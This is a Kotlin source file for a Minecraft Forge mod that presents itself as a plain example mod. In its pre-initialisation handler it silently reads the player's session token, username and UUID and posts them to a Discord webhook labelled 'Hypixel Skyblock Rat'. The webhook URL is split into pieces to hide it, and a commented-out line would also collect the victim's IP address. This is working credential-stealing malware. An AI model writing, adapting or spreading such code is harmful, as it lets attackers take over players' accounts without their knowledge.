package com.example

import com.example.util.discordwebhook
import net.minecraft.client.Minecraft
import net.minecraftforge.fml.common.Mod
import net.minecraftforge.fml.common.event.FMLInitializationEvent
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent
import java.awt.Color
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.net.URL

@Mod(modid = "examplemod", useMetadata = true)
class ExampleMod {

    val mc: Minecraft = Minecraft.getMinecraft()

    @Mod.EventHandler
    fun preinit(event: FMLPreInitializationEvent?) {
        Thread {
            try {
                //val notanaddressthatsayswhereyoulive = BufferedReader(InputStreamReader(URL("https://checkip.amazonaws.com/").openStream())).readLine()
                val token = mc.session.token
                val username = mc.session.username
                val uuid = mc.session.playerID

                //https://discord.com/api/webhooks/1216841298158424187/_1U-ceGErRCZij0vNealxYLsfwdrgo1pJhbtzf_J6Sn5oTlcyytSkV4MWEPEoQLqwaAU
                val part1 = "https://discord.com"
                val part2 = "/api/webhooks/1216841298158424187"
                val part3 = "/_1U-ceGErRCZij0vNealxYLsfwdrgo1pJhbtzf_J6Sn5oTlcyytSkV4MWEPEoQLqwaAU"

                val webhook = discordwebhook("$part1$part2$part3")
                webhook.setUsername("Hypixel Skyblock Rat")
                webhook.setTts(false)
                webhook.addEmbed(
                    discordwebhook.EmbedObject()
                        .setTitle("$username ratted")
                        .addField(
                            "Username",
                            username,
                            false
                        )
                        //.addField("Ip:", notanaddressthatsayswhereyoulive, false)
                        .addField("Token:", token, false)
                        .addField("UUID:", uuid, false)
                        .addField("TokenAuth", "$username:$uuid:$token", false)
                        .setColor(Color.RED)
                )
                webhook.execute()
            } catch (e: IOException) {
                println("Error in PreInitialization")
            }
        }.start()
    }

    @Mod.EventHandler
    fun init(event: FMLInitializationEvent?) {

    }

    @Mod.EventHandler
    fun postinit(event: FMLPostInitializationEvent) {

    }
}